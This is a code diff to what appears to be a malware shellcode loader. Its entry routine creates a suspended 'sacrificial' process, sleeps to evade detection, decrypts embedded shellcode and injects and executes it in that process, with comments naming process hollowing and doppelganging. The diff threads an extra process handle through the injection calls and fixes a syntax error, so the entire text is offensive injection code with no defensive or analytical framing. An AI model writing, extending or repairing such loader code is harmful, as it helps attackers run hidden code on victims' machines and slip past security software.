@@ -11,6 +11,7 @@ VOID entry(void)
 {
 	DWORD	pid = 0;
 	HANDLE	process_handle = INVALID_HANDLE_VALUE;
+	HANDLE	additional_handle = INVALID_HANDLE_VALUE;
 
 #pragma region Guard Rails
 
@@ -59,16 +60,16 @@ VOID entry(void)
 
 #if CONFIG_CREATE_PROCESS_METHOD == 1
 	LPCSTR file_path = CONFIG_SACRIFICIAL_PROCESS;
-	process_handle = malapi::CreateSuspendedProcess((LPSTR)CONFIG_SACRIFICIAL_PROCESS);
+	malapi::CreateSuspendedProcess((LPSTR)CONFIG_SACRIFICIAL_PROCESS, &process_handle, &additional_handle);
 
 	SleepMethod(SLEEP_TIME);
 
-	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key))
+	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));
 
 #elif CONFIG_CREATE_PROCESS_METHOD == 2
 	//
 	// ProcessHollowing
-	// AddressOfEntryPoint
+	// InjectionAddressOfEntryPoint
 	// DoppleGanging
 	//
 	LPCSTR file_path = CONFIG_SACRIFICIAL_PROCESS;
@@ -111,7 +112,7 @@ VOID entry(void)
 
 #endif
 
-	if (!ExecuteShellcode(process_handle, shellcode, shellcode_size))
+	if (!ExecuteShellcode(process_handle, shellcode, shellcode_size, additional_handle))
 	{
 		LOG_ERROR("Failed to execute shellcode.");
 	}
